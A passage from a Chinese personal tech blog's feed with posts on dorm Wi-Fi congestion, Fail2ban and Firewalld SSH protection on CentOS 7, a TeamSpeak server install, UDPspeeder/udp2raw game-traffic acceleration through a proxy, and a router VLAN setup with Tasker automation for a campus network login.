在网络搜索</p><p>找到在华为论坛上发表的一篇文章</p><p>具体的就不说了 大概就是由于别的设备厂商私自安装了 AP</p><p>导致 SSID 数量剧增 导致了错包增加 以至于有些宿舍基本无网</p><p>文章里给出的一个解决方法就是<strong>降低所有 AP 的发射功率</strong></p><p>来尽量实现每个宿舍只能搜到一个自己宿舍的 AP</p><p>这篇文章给了我很大的启示 然后我就去下载了 Wifi Analyzer</p><p>结果大家也看到了 惨不忍睹</p><p>直到最近的断线事件 让我彻底转向了 5G</p><p>那天全宿舍用 2.4G 的基本无法正常使用网络 几秒掉线一次</p><p>我就 ping 了下路由器 发现 80%的丢包 即使没丢包的 也都基本在 1000ms 以上</p><p>这之后 我就换了 Intel AC8265</p><h2 id="关于恶性循环"><a href="#关于恶性循环" class="headerlink" title="关于恶性循环"></a>关于恶性循环</h2><p>我简介里面写的恶性循环 是这么一个事</p><p>由于我校网络环境的特殊 若想使用无线 每个宿舍都需要一个路由器来做无线 AP</p><p>但我发现很多宿舍使用了不止一台路由器来做无线 AP</p><p>问其原因 他们只会说 很慢</p><p>第一次听到这个言论的时候我其实是很气愤的</p><p>因为理论上一般路由器内的交换机为 100M 假设一个宿舍 4 个人</p><p>每个人一个帐号而且都是 20M 的网络</p><p>也就是说在按账号限速的这种方式下 外网的流量只会占用 80M</p><p>就是说每个人满速跑下载都还有剩余</p><p>所以那时我认为是他们的路由器垃圾 XD</p><p>到现在 我发现那篇文章里的方法 即<strong>降低所有 AP 的发射功率</strong></p><p>是不可能实现的 这就导致了一个问题</p><p>普通人在发现网络很慢后 他会怪罪于无线路由</p><p>他的解决方法是加装一个无线路由做 AP</p><p>但是一个宿舍两个甚至三四个 AP 使得 2.4G 极为拥挤</p><p>这还只是一个宿舍 若旁边的多个宿舍都这样进行加装</p><p>那么就会导致人多时使用 2.4G 的网络 基本属于瘫痪</p><p>当然上面可以夸张了</p><p>但是认真想想 慢-&gt;加装 2.4G-&gt;2.4G 拥挤-&gt;继续加装</p><p>这不是一个恶性循环么</p><h2 id="结尾"><a href="#结尾" class="headerlink" title="结尾"></a>结尾</h2><p>其实这篇文的主题是想大家如果能够上 5G 的 尽量上 5G</p><p>理由就是在宿舍这个环境里 5G 相对稳定而且快</p><p>关于 5G 的天生穿墙弱 在宿舍这个环境里反而成为了优势</p><p>因为这会使得每个宿舍都只能搜到自己宿舍的 5G 信号</p><p>从而使得本来不拥挤的 5G 更不拥挤了</p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>之前的网卡也是 Wifi/蓝牙模块 但是使用蓝牙耳机时经常跳读</p><p>哪怕坐在电脑前 这使我很难受</p><p>更换了 8265 后 我发现蓝牙的连接变得稳定许多</p><p>哪怕在阳台都能不跳读 这是我没想到的</p><p>今天突发奇想既然 LDAC 索尼自己抱着 那么 APT-X 可以么</p><p>于是经过一番搜索</p><p>知道了</p><ol><li>要用 APT-X 就要给钱</li><li>Win10 已经内置了 APT-X</li><li>结合上面两点 其实得不出 Win10 能不能直接用 APT-X 的结论</li></ol><p>同时有网友发现戴尔是买过 APT-X 的授权的</p><p>所以使用某些网卡的机子可以通过安装戴尔的蓝牙驱动来实现 APT-X 播放</p><p>很幸运的是 8265 也在这个行列中 所以根据文章提示成功开启了 APT-X</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9q0uIx.png" alt="9q0uIx.png"></p><p>没想到 8265 还给我带来了这样的惊喜</p>]]></content>
    
    <summary type="html">
    
      恶性循环
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Network" scheme="https://burgertown.tk/tags/Network/"/>
    
      <category term="Wifi" scheme="https://burgertown.tk/tags/Wifi/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 安装 Fail2ban 配合 Firewalld 防止 SSH 爆破</title>
    <link href="https://burgertown.tk/2018/03/09/fail2ban/"/>
    <id>https://burgertown.tk/2018/03/09/fail2ban/</id>
    <published>2018-03-09T09:18:48.000Z</published>
    <updated>2019-10-29T15:57:31.922Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>前些天 <a href="/2018/03/09/TeamSpeak/">部署了 TeamSpeak 服务端在本机上</a> 嘛</p><p>决定做点事来尽量防止 SSH 爆破</p><p>而 CentOS 7 自带的是 Firewalld 那就用他搭配 Fail2ban 吧</p><h2 id="启用-Firewalld"><a href="#启用-Firewalld" class="headerlink" title="启用 Firewalld"></a>启用 Firewalld</h2><p>默认是不会关闭的 像我这样这样再次启用 启用之前需要把开放的端口告诉 Firewalld</p><p>下面以开放 tcp22 端口为示例</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=22/tcp --permanent</span><br></pre></td></tr></table></figure><p>设置完成后重新加载配置</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure><p>查看已放行端口</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --list-ports</span><br></pre></td></tr></table></figure><h2 id="安装-Fail2ban"><a href="#安装-Fail2ban" class="headerlink" title="安装 Fail2ban"></a>安装 Fail2ban</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum -y install epel-release</span><br><span class="line">yum -y install fail2ban</span><br></pre></td></tr></table></figure><h2 id="配置-Fail2ban"><a href="#配置-Fail2ban" class="headerlink" title="配置 Fail2ban"></a>配置 Fail2ban</h2><p>安装完成后 Fail2ban 的配置文件的路径为</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/fail2ban</span><br></pre></td></tr></table></figure><p>在此目录下新建<code>jail.local</code>来配置 Fail2ban</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">[DEFAULT]</span><br><span class="line">ignoreip = 127.0.0.1/8</span><br><span class="line">bantime  = 86400</span><br><span class="line">findtime = 600</span><br><span class="line">maxretry = 5</span><br><span class="line">banaction = firewallcmd-ipset</span><br><span class="line">action = %(action_mwl)s</span><br><span class="line"></span><br><span class="line">[sshd]</span><br><span class="line">enabled = <span class="literal">true</span></span><br><span class="line">filter  = sshd</span><br><span class="line">port    = 22</span><br><span class="line">action = %(action_mwl)s</span><br><span class="line">logpath = /var/<span class="built_in">log</span>/secure</span><br></pre></td></tr></table></figure><p>其中的配置项为：</p><ul><li>ignoreip：IP 白名单，白名单中的 IP 不会屏蔽，可填写多个以（,）分隔</li><li>bantime：屏蔽时间，单位为秒（s）</li><li>findtime：时间范围</li><li>maxretry：最大次数</li><li>banaction：屏蔽 IP 所使用的方法，上面使用 firewalld 屏蔽端口</li><li>[sshd]：名称，可以随便填写</li><li>filter：规则名称，必须填写位于 filter.d 目录里面的规则，sshd 是 fail2ban 内置规则</li><li>port：对应的端口</li><li>action：采取的行动</li><li>logpath：需要监视的日志路径</li></ul><p>上面的配置意思是如果同一个 IP 在 10 分钟内连续超过 5 次错误 则使用 Firewalld 将他 IP ban 了</p><p>修改完后重新启动 Fail2ban</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">systemctl start fail2ban</span><br></pre></td></tr></table></figure><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实 Fail2ban 还有其他很神奇的用处</p><p><del>欢迎大家讨论</del></p>]]></content>
    
    <summary type="html">
    
      Safty First
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>CentOS 7 上搭建 TeamSpeak 服务端</title>
    <link href="https://burgertown.tk/2018/03/09/TeamSpeak/"/>
    <id>https://burgertown.tk/2018/03/09/TeamSpeak/</id>
    <published>2018-03-09T09:18:48.000Z</published>
    <updated>2019-09-29T18:06:58.752Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>实在受不了 YY 的流氓 决定使用本服务器搭建 <a href="https://www.teamspeak.com/en/">TeamSpeak</a> 服务端</p><h2 id="搭建"><a href="#搭建" class="headerlink" title="搭建"></a>搭建</h2><p>TeamSpeak 提供了多个平台的服务端 包括 Mac OS、Linux、Windows、FreeBSD</p><p>更新和安装依赖项</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yum update</span><br><span class="line">yum install nano wget perl tar net-tools bzip2</span><br></pre></td></tr></table></figure><p>进入 <a href="https://www.teamspeak.com/en/downloads.html#server">下载页面</a>  本服务器系统为 CentOS 7 64bit 所以选择 Linux 64bit</p><p>复制链接并 SSH 到服务器上 通过 <code>wget</code> 来下载压缩文件 并通过 <code>tar -zxvf</code> 解压</p><p>teamspeak 不建议用户直接在 root 用户上运行 新建一个名为”teamspeak”的用户 并设置主目录为 <code>/home/teamspeak</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adduser teamspeak -d /home/teamspeak</span><br></pre></td></tr></table></figure><p>将 teamspeak 移动到 <code>/home/teamspeak</code> 文件夹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv teamspeak3-server_linux_amd64/* /home/teamspeak</span><br></pre></td></tr></table></figure><p>清除残留文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -rf teamspeak3-server_linux_amd64*</span><br></pre></td></tr></table></figure><p>更改 <code>/home/teamspeak</code> 的所有权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chown -R teamspeak: /home/teamspeak</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><p>切换到”teamspeak”用户并运行 teamspeak 服务端</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">su - teamspeak</span><br><span class="line">./ts3server_startscript.sh start</span><br></pre></td></tr></table></figure><p>第一次运行会输出管理员的密钥 需要记下 如果忘了 可以查看最早的 log 来找回</p><p>别忘了让防火墙开放 9987 端口</p><h2 id="停止"><a href="#停止" class="headerlink" title="停止"></a>停止</h2><p>在”teamspeak”用户下 运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ts3server_startscript.sh stop</span><br></pre></td></tr></table></figure><h2 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h2><p>服务端如图设置即可</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/9RGaCQ.png" alt="9RGaCQ.png"></p><h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>欢迎大家来这吹逼 有什么意见可以在评论区留下你的看法</p><p>或者直接 <a href="mailto:BurgerTownLuo@gmail.com">BurgerTownLuo@gmail.com</a></p>]]></content>
    
    <summary type="html">
    
      PUBG 启动！落地成盒！PUBG 卸载！
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
  </entry>
  
  <entry>
    <title>UDPSpeeder 等配合 SSTap 进行网游加速</title>
    <link href="https://burgertown.tk/2017/12/25/Speeder/"/>
    <id>https://burgertown.tk/2017/12/25/Speeder/</id>
    <published>2017-12-25T06:42:47.000Z</published>
    <updated>2019-10-29T15:57:27.502Z</updated>
    
    <content type="html"><![CDATA[<h2 id="First-Thing-First"><a href="#First-Thing-First" class="headerlink" title="First Thing First"></a>First Thing First</h2><p><strong><em>Today is Christmas</em></strong></p><p><strong><em>So Merry Christmas</em></strong></p><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p><strong>此方案适合已搭建$$或者$$R 的 因为此文中配合的 SSTap</strong></p><p>写这文的动机是因为作者的教程里面没有提到配合$$使用 所以本文针对这个来进行</p><p>下面这几个放出项目地址的都是 <a href="https://github.com/wangyu-/">wangyu-</a> 开发的</p><p>项目地址</p><p><a href="https://github.com/wangyu-/udp2raw-tunnel">udp2raw</a><br><a href="https://github.com/wangyu-/UDPspeeder">UDPspeeder</a><br><a href="https://github.com/wangyu-/tinyPortMapper">tinyPortMapper</a><br><a href="https://github.com/wangyu-/udp2raw-multiplatform">udp2raw-multiplatform</a></p><h2 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h2><p>Q: 为什么游戏要用 UDP</p><p>A: <a href="https://www.zhihu.com/question/23356564/answer/87087330">网络游戏 采用的是 tcp 协议还是 udp 协议？ - fei zhang 的回答 - 知乎</a></p><p>通过阅读 Github 我自行总结出</p><ol><li>UDPspeeder 会在发包时会多发包以此保障丢包不影响正常的连接</li><li>udp2raw 将 UDP 伪装成 TCP 包 保证包不被运营商的奇特策略丢弃</li><li>$$或$$R 的流量经过加密后依然为原数据包的协议</li><li>UDP 和 TCP 的端口号没关联</li></ol><p><strong>上面只是概括 更多详情请自行查阅项目地址与学习计算机网络的知识</strong></p><p>拓拔图</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">                                       TCP↓</span><br><span class="line">                    |-------------tinyPortMapper-------------|</span><br><span class="line">SSTap--raspberrypi--|                                        |--$$ Server</span><br><span class="line">                    |--UDPspeeder client--UDPspeeder server--|</span><br><span class="line">                                       UDP↑</span><br></pre></td></tr></table></figure><p>如果需要串联 udp2raw 用这个图脑补 UDP 链路</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--UDPspeeder client--udp2raw client--udp2raw server--UDPspeeder server--</span><br></pre></td></tr></table></figure><p>也就是把 UDPspeeder server 的出口用 udp2raw server 包装起来</p><p>同样的用 udp2raw client 解包并把解包后的包转给 UDPspeeder client</p><p>也可以直接点进这里 <a href="https://github.com/wangyu-/UDPspeeder/wiki/UDPspeeder%E5%92%8Cudp2raw%E4%B8%B2%E8%81%94%E5%8A%A0%E9%80%9FOpenVPN">UDPspeeder 和 udp2raw 串联加速 OpenVPN</a></p><p><strong>为了方便 就不演示怎么搭配 udp2raw 有问题的可以在评论区里问</strong></p><p><strong><del>如果看不到评论区 请检查梯子</del></strong></p><h2 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h2><p>假设$$服务在监听 443 端口 VPS 地址为 45.66.77.88</p><p>UDPspeeder 监听端口为 2333 参数使用游戏模式的 <a href="https://github.com/wangyu-/UDPspeeder/wiki/%E6%8E%A8%E8%8D%90%E8%AE%BE%E7%BD%AE">推荐设置</a></p><p>更多参数请点 <a href="https://github.com/wangyu-/UDPspeeder/">这里</a></p><p>先上传 <a href="https://github.com/wangyu-/UDPspeeder/releases">UDPspeeder</a> 的二进制文件的 <a href="https://github.com/wangyu-/UDPspeeder/wiki/How-to-choose-a-binary-for-your-device">对应</a> 版本到 VPS 然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./speederv2 -s -l 0.0.0.0:2333 -r 127.0.0.1:443   -k <span class="string">&quot;passwd&quot;</span> --mode 0 -f2:4 -q1</span><br></pre></td></tr></table></figure><p>VPS 上就这样了</p><h2 id="Linux-客户端"><a href="#Linux-客户端" class="headerlink" title="Linux 客户端"></a>Linux 客户端</h2><p>这里可以自定义监听端口 假设为 800</p><p>先上传 <a href="https://github.com/wangyu-/UDPspeeder/releases">UDPspeeder</a> 和 <a href="https://github.com/wangyu-/tinyPortMapper/releases">tinyPortMapper</a> 的二进制文件的 <a href="https://github.com/wangyu-/UDPspeeder/wiki/How-to-choose-a-binary-for-your-device">对应</a> 版本到树莓派 然后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./speederv2 -c -l 0.0.0.0:800 -r 45.66.77.88:2333   -k <span class="string">&quot;passwd&quot;</span> --mode 0 -f2:4 -q1</span><br><span class="line">./tinymapper -l 0.0.0.0:800 -r 45.66.77.88:443 -t   <span class="comment">#将 TCP:800 转发到 45.66.77.88:443</span></span><br></pre></td></tr></table></figure><p><strong>UDPspeeder 的参数 server 和 client 需要一致</strong><br><strong>如果会使用 iptables 等 可以不使用 tinymapper</strong></p><h2 id="Windows-客户端"><a href="#Windows-客户端" class="headerlink" title="Windows 客户端"></a>Windows 客户端</h2><p><strong>于 2018/07/03 更新</strong></p><p><strong>新 repo 叫 <a href="https://github.com/wangyu-/udp2raw-multiplatform">udp2raw-multiplatform</a> 即 udp2raw 的多平台版 而 tinyPortMapper 和 udpspeeder 都在原 repo 上更新了</strong></p><p>根据 <a href="https://github.com/wangyu-/udp2raw-multiplatform/wiki/%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8">快速入门</a> 我们知道服务端可以沿用 Linux 版 所以我们这里只对客户端部分进行延伸</p><p>首先要安装 <a href="https://www.winpcap.org/install/default.htm">pcap</a> 下载安装一路简单 不说</p><p>从 <a href="https://github.com/wangyu-/udp2raw-multiplatform/releases">udp2raw-multiplatform</a>/<a href="https://github.com/wangyu-/tinyPortMapper/releases">tinyPortMapper</a>/<a href="https://github.com/wangyu-/UDPspeeder/releases">UDPspeeder</a> 处获取对应的 Windows 客户端并解压到一定位置</p><p>打开 CMD/PowerShell/Cmder 之类的终端软件 进入到客户端解压的位置</p><p><strong>分别于不同的终端中执行</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">./tinymapper.exe -l 0.0.0.0:100 -r 服务器 IP:$$端口 -t</span><br><span class="line">./udp2raw_mp.exe -c -l 0.0.0.0:100 -r 服务器 IP:udp2raw 端口 -k 密码 --raw-mode easy-faketcp</span><br></pre></td></tr></table></figure><p>更多配置请看 <a href="https://github.com/wangyu-/udp2raw-multiplatform/wiki">wiki</a></p><p>效果如图（只配置了 tinyPortMapper 与 udp2raw)<br><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/PE2Z59.png" alt="PE2Z59.png"></p><h2 id="配置-SSTap"><a href="#配置-SSTap" class="headerlink" title="配置 SSTap"></a>配置 SSTap</h2><p>添加一个$$代理</p><p>IP 设置为运行着客户端机器的 IP 端口为自行设置的端口</p><p>密码 协议等 与$$服务的一样</p><p>如果配置得当 就会得到这样的结果</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/vTejH.png" alt="vTejH.png"></p><p>然后选择游戏 连接 就行了</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里只简单阐述了配置的过程</p><p>关于 SSTap 因为<em>灵活性与可扩展</em>都比较比较强 所以个人推荐使用 SSTap</p><p>关于服务器的地区 由于一般外服游戏在* HK *都有服务器 所以 VPS 所在地当然推荐 HK</p><p>关于系统 服务端：<em>Linux</em> 客户端：*Linux/Windwos/Mac *都可以</p><p>关于参数 需要根据 VPS 的带宽 当前到 VPS 延迟与丢包进行自己的实验</p><p><del>你还需要拥有用来跑客户端软件的 Linux 系统的主机 我这里是树莓派 Linux 路由器当然也可以</del></p><p><strong>针对我校的网络好像会突然 QoS 的现象 所以推荐配合 udp2raw 使用</strong></p><p><strong>可以在 Github 的 Issue 上找到很多有趣的东西 XD</strong></p><p><strong>EOF</strong></p>]]></content>
    
    <summary type="html">
    
      整天玩游戏 有没出息！
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="VPS" scheme="https://burgertown.tk/tags/VPS/"/>
    
      <category term="Network" scheme="https://burgertown.tk/tags/Network/"/>
    
  </entry>
  
  <entry>
    <title>VLAN 与校园网（操作教程）</title>
    <link href="https://burgertown.tk/2017/10/18/Vlan/"/>
    <id>https://burgertown.tk/2017/10/18/Vlan/</id>
    <published>2017-10-18T00:46:58.000Z</published>
    <updated>2019-09-30T02:38:50.245Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>把 <a href="/2017/10/01/VLAN-and-Esurf/">VLAN 与校园网（想法）</a> 链接扔到新生群里之后点击量暴增</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Y3oqA.png" alt="Y3oqA.png"></p><p>然后顺手又问了一句要不要写个教程啊</p><p>于是就有了这个教程</p><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><p>首先需要一个智能路由器 <del>别问我什么是智能路由器</del> 要能支持设置 VLAN 的</p><p>还需要多一条网线 即共需要两条网线</p><p>至于什么是 VLAN 请点击下面链接自行 <del>懵逼</del> 学习</p><p><a href="https://zh.wikipedia.org/zh-cn/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91">Wikipedia（自带梯子）</a>  <a href="https://baike.baidu.com/item/%E8%99%9A%E6%8B%9F%E5%B1%80%E5%9F%9F%E7%BD%91">百度百科</a>  <a href="http://blog.csdn.net/lycb_gz/article/details/6693826">深入理解 VLAN 形成和工作原理</a></p><h2 id="接线"><a href="#接线" class="headerlink" title="接线"></a>接线</h2><p>共有两条线</p><ol><li>交换机-路由器 WAN 口</li><li>交换机-路由器任意 LAN 口（记住是 LAN 几）</li></ol><p>这里我建议第二条线接到离 WAN 口最远的 LAN 口 因为比较容易区分</p><p>所以本次教程中第二条线接到了 LAN4</p><h2 id="克隆-MAC"><a href="#克隆-MAC" class="headerlink" title="克隆 MAC"></a>克隆 MAC</h2><p>这一步不多说 WAN 口克隆即可</p><h2 id="VLAN-设置"><a href="#VLAN-设置" class="headerlink" title="VLAN 设置"></a>VLAN 设置</h2><p>勾选 <code>启用 VLAN</code> 并创建两个 VLAN</p><p><del>如果是使用 luci 为管理界面的路由器 在 BootStrap 主题下可以清楚的看到哪个接口已经接线</del></p><ol><li>将 CPU 设置为 <code>关联</code> 除了<strong>接交换机的线的口 即 <code>LAN4</code></strong>设置为 <code>关</code> 其他为 <code>不关联</code></li><li>将 CPU 设置为 <code>关联</code> 除了<strong>接交换机的线的口 即 <code>LAN4</code></strong>设置为 <code>不关联</code> 其他为 <code>关</code></li></ol><p>保存并应用 设置好的界面如图</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Y3jxg.png" alt="Y3jxg.png"></p><h2 id="接口设置"><a href="#接口设置" class="headerlink" title="接口设置"></a>接口设置</h2><p>一般来说默认两个接口 一个 LAN 一个 WAN 我们需要新建一个接口 名称随意</p><p>在 <code>包括以下接口</code> 里选择 <code>交换机 VLAN:&quot;eth0.2&quot;</code> 如图</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Y8Caq.png" alt="Y8Caq.png"></p><p>然后提交</p><h2 id="无线设置"><a href="#无线设置" class="headerlink" title="无线设置"></a>无线设置</h2><p>在无线的页面里选择添加 自行设置加密与名字之类的 模式为 AP 即可</p><p><strong>网络那一栏勾选你在 <code>接口设置</code> 那一步新建的接口</strong> 如图</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Y3OG8.png" alt="Y3OG8.png"></p><p>然后保存并应用</p><h2 id="以后的每天早上"><a href="#以后的每天早上" class="headerlink" title="以后的每天早上"></a>以后的每天早上</h2><ol><li>用手机连接到新建的那个 WIFI 例如我这里就是 <code>Just4Login</code></li><li>用天翼的软件登陆</li><li>杀软件 关闭手机的 WIFI</li><li>连接到原有的 WIFI 进入路由器管理页面 网络-接口 WAN 口选择重连</li><li>EOF</li></ol><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇教程只是按照顺序说了怎么操作</p><p>至于其中的思路啊原理啊都在 <a href="/2017/10/01/VLAN-and-Esurf/">VLAN 与校园网（想法）</a> 这里有说 有什么不懂的可以在群里或者评论里面问</p><p>当然我本人因为懒 还用了 tasker 实现了连上 <code>Just4Login</code> 这个 SSID 的 WIFI 就自动进行以下操作</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/Y8EzF.md.png" alt="Y8EzF.md.png"></p><p>实现了自动登陆 并且由于手机设置里面并没有把 <code>Just4Login</code> 选择自动连接</p><p>而原 WIFI 有自动连接 所以不会误连接</p><p><strong>我个人现在最不舒服的就是要进行 WAN 的重连 希望有大佬能够写个脚本 XD</strong></p><p>EOF</p><h2 id="2017-Christmas-Update"><a href="#2017-Christmas-Update" class="headerlink" title="2017 Christmas Update"></a>2017 Christmas Update</h2><p>关于自动登陆 我用一台闲置手机与 Tasker 实现了</p><p>手机要求：有 ROOT 且无锁屏密码</p><p>路由器：当然是智能路由</p><p>思路如下</p><p>手机：定时 解锁 开启 WIFI 并自动连接 打开客户端 模拟点击 等待 10S 杀死天翼 关闭 WIFI</p><p>路由器：定时 开关指定 WAN 口</p><p>Tasker 配置如下</p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/v7jOJ.md.png" alt="v7jOJ.md.png"></p><p>实现定时开启 WIFI 的操作与指定连接 WIFI 后进行的操作</p><p><strong>连接 WIFI 之后</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/v7xm9.md.png" alt="v7xm9.md.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sleep 5</span><br><span class="line">input tap 900 1000</span><br><span class="line">sleep 5</span><br></pre></td></tr></table></figure><p><code>sleep</code>为睡眠 即等待</p><p><code>input tap x y</code>为模拟点击屏幕坐标 (x,y)</p><p>即操作步骤为 先杀死客户端 <del>如果没死</del> 然后打开客户端 模拟点击<code>登陆</code> 然后杀死 关 WIFI</p><p><strong>理论上 1080P 的屏幕上的登陆按钮可以使用这个参数</strong></p><p><strong>定时执行的操作</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/vHFSO.md.png" alt="vHFSO.md.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Input keyevent 26</span><br><span class="line">sleep 2</span><br><span class="line">Input swipe 500 1700 500 600 500</span><br></pre></td></tr></table></figure><p><code>input keyevent 26</code>为模拟按下电源键</p><p><code>Input swipe</code>为模拟滑动屏幕’</p><p>即操作步骤为 模拟按下电源键 向上滑动解锁屏幕</p><p><strong>路由器的设置</strong></p><p><img data-src="https://blog-1253475808.file.myqcloud.com/picBed/vHEOH.png" alt="vHEOH.png"></p><p>即每天 23:59 关闭 vwan1 和 vwan2 接口</p><p>每天 6:47 自动启动 vwan2</p><p><strong>由于手机在 6:45 已经自动执行了<code>登陆</code>操作 所以路由器的 vwan2 接口在开启后可以正常上网</strong></p><p>参考资料：<br><a href="https://www.zhihu.com/question/29633347/answer/89376754">如何使用 tasker 实现输入功能？ - Mike Yin 的回答 - 知乎</a></p><p><a href="http://yangqijun.iteye.com/blog/1173016">Linux 下 crontab 的使用</a> <del>竟然有在线表达式生成器 惊了</del></p><p><strong>有什么问题评论区见</strong></p>]]></content>
    
    <summary type="html">
    
      多思考 多动手
    
    </summary>
    
    
      <category term="Tech" scheme="https://burgertown.tk/categories/Tech/"/>
    
    
      <category term="Network" scheme="https://burgertown.tk/tags/Network/"/>
    
      <category term="VLAN" scheme="https://burgertown.tk/tags/VLAN/"/>
    
  </entry>
  
  <entry>
    <title>Black And White</title>
    <link href="https://burgertown.tk/2017/10/10/b-w/"/>
    <id>https://burgertown.tk/2017/10/10/b-w/</id>
    <published>2017-10-10T15:02:51.000Z</published>
    <updated>2019-09-29T17:51:45.912Z</updated>
    
    <content type="html"><![CDATA[<p>心情就这样</p><blockquote class="blockquote-center">**器材：魅族 Pro6 后期：Snapseed**  *4.03mm F/2.2 1/25 257* </blockquote><blockquote class="instagram-media" data-instgrm-version="7" style=" background:#FFF; border:0; border-radius:3px; box-shadow:0 0 1px 0 rgba(0,0,0,0.5),0 1px 10px 0 rgba(0,0,0,0.15); margin: 1px; max-width:658px; padding:0; width:99.375%; width:-webkit-calc(100% - 2px); width:calc(100% - 2px);"><div style="padding:8px;"> <div style=" background:#F8F8F8; line-height:0; margin-top:40px; padding:28.14814814814815% 0; text-align:center; width:100%;"> <div style=" 